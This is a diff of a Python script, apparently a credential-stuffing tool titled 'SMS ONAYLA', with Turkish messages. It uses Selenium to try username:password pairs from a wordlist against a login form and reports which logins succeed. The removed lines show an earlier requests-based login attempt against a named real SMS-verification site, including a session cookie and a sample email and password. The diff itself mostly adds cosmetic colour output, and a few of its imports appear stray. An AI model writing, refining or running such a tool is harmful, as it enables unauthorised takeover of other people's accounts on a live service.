@@ -1,53 +1,21 @@
-"""import  requests
+#Coded By Tetra
+from mimetypes import inited
 
-url = "https://smsonayservisi.com/login"
-headers = {
-   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
-    "Accept": "*/*",
-    "Accept-Language":" tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
-   " Accept-Encoding": "gzip, deflate, br, zstd",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "X-Requested-With": "XMLHttpRequest",
-    "Content-Length": "32",
-    "Origin": "https://smsonayservisi.com",
-    "Connection": "keep-alive",
-    "Referer": "https://smsonayservisi.com/login",
-   " Cookie": "ci_session=999fa816528e3ea7d9de0d33c8dc50f5dd931199",
-    "Sec-Fetch-Dest": "empty",
-   " Sec-Fetch-Mode": "cors",
-    "Sec-Fetch-Site": "same-origin",
-    "Priority":" u=0",
-    "TE": "trailers",
-}
-
-data = {
-    "email":"ataberk@gmail.com",
-    "password":"fhd"
-}
-
-response = requests.post(url=url , headers=headers, data= data)
-
-print(response.status_code)
-print(response.text)"""
-from lib2to3.pgen2.grammar import opmap_raw
-
-"""word = input("W yttou:")
-
-with open(word , "r") as fi:
-    oku = fi.readlines()
-    for i in oku:
-        print(i)"""
-
-
+from pywin.framework.toolmenu import idPos
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import time
+from colorama import  Fore , init
+import  pyfiglet
+
 
 def main():
-    wordlist = input("Wordlist Yolunu Girin: ")
+    logo = pyfiglet.figlet_format("SMS ONAYLA")
+    print(Fore.RED + logo)
+    wordlist = input(f" {Fore.MAGENTA} \nWordlist Yolunu Girin: ")
     options = webdriver.ChromeOptions()
     options.add_argument("--start-maximized")
 
@@ -70,7 +38,7 @@ def main():
                 for urls in oku:
                     parcala = urls.strip().split(":")
                     if len(parcala) != 2:
-                        print(f"Hatalı Format: {urls.strip()}")
+                        print(f"{Fore.RED} [X]Hatalı Format: {urls.strip()}")
                         continue
 
                     username, passwords = parcala
@@ -90,22 +58,22 @@ def main():
                                 EC.element_to_be_clickable((By.XPATH, "//button[normalize-space()='OK']"))
                             )
                             error_button.click()
-                            print(f"Başarısız giriş: {username}:{passwords}")
+                            print(f"{Fore.YELLOW}\nBaşarısız giriş: {username}:{passwords}")
                         except Exception:
-                            print(f"Başarılı giriş: {username}:{passwords}")
+                            print(f"{Fore.GREEN}\nBaşarılı giriş: {username}:{passwords}")
                             break  # Başarılı giriş sonrası döngüyü kır
 
                     except Exception as e:
-                        print(f"Hata oluştu: {e}")
+                        print(f"{Fore.RED}Hata oluştu: {e}")
 
                     # Input alanlarını temizle
                     username_input.clear()
                     password_input.clear()
 
         except FileNotFoundError:
-            print("Belirtilen Dosya Yolu Bulunamadı.")
+            print(f"{Fore.YELLOW}Belirtilen Dosya Yolu Bulunamadı.")
         except Exception as e:
-            print(f"Bilinmeyen Hata: {e}")
+            print(f"{Fore.BLUE}Bilinmeyen Hata: {e}")
         finally:
             driver.quit()
 
